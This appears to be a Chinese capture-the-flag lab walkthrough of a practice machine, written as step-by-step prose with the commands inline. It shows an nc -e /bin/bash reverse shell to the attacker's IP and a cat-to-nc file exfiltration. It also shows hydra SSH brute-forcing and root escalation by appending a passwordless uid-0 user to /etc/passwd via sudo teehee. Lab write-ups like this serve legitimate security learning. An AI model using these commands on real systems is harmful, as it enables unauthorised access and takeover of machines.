
nmap -sn 扫端口，发现开放80和22，打开web服务后只有一个登陆框，输入错误啥都不反回，只是清空登陆框的用户名和密码；先扫目录，啥也没扫到。

可以尝试爆破，爆破出账号密码为admin ,happy,典型的弱口令，登陆发现是个命令执行网站，但是只能执行页面上给出的3条指定命令，不能自己输入命令，所以用bp抓包改命令，写个反弹shell,命令，nc -e /bin/bash kali的ip 端口号 ,直接就连接上了，先升级为交互终端，然后配置终端类型，export TERM=xterm ，这样就可以用clear命令了,cd 到/home, ls, 发现有3个用户，这3个用户都有着不同的权限，可以找出3个用户的密码，因为它开放了ssh服务，可以远程登陆，但是也可以 su 切换用户，刚好在这反弹shell上没有限制su命令，两条路都能走

回到反弹的shell,发现3个用户中只有1个用户 jim 里面有文件，用 find /home -type f 2>/dev/null去找文件，发现了一个old-passwords.bak文件，备份密码；在靶机用nc工具与kali建立tcp连接，把old-passwords.bak文件传送给kali, 靶机 执行 cat old-passwords.bak|nc kali的ip 端口号   kali执行  nc -lvnp 端口号 > pw.txt 

然后用hydra 爆破jim的ssh,  命令 ： hydra  -l jim -P pw.txt 靶机ip ssh  

爆破出来后用kail 去远程登陆jim， ssh jim@靶机IP 

登陆后先sudo -l，啥都没有，这里用邮箱泄露来提取，cat /var/mail/jim 发现jim与另一个用户charles的邮件，邮件直接暴露charles的密码，登陆到charles用户，sudo -l 发现有个NOPASS的命令 teehee,就是个文本编辑器，

开始提权：
用  echo '用户名：：0：0：：：/bin/bash'|sudo teehee -a /etc/passwd  可以创建一个最高权限用户

-a 参数为追加，不能用重定向 > 代替，-a是teehee的参数，有有root权限的teehee打开 /etc/passwd这个配置文件并写入；如果换成重定向>，是charles用户这个低权限的shell去打开/etc/passwd,所以显示权限否认，执行不了那条命令；

命令解析     用户名:密码占位符:uid:gid:注释:家目录:登录shell    

如果不设置密码，密码占位符就不填

/etc/passwd  是个系统配置文件，专门用来存用户信息的，需要和passwd 这个命令区别开来，passwd是用来改密码的命令，而前面个那个是个配置文件，

创建了一个无密码的最高权限用户后，su 切换改用户，在 /root 下发现flag



 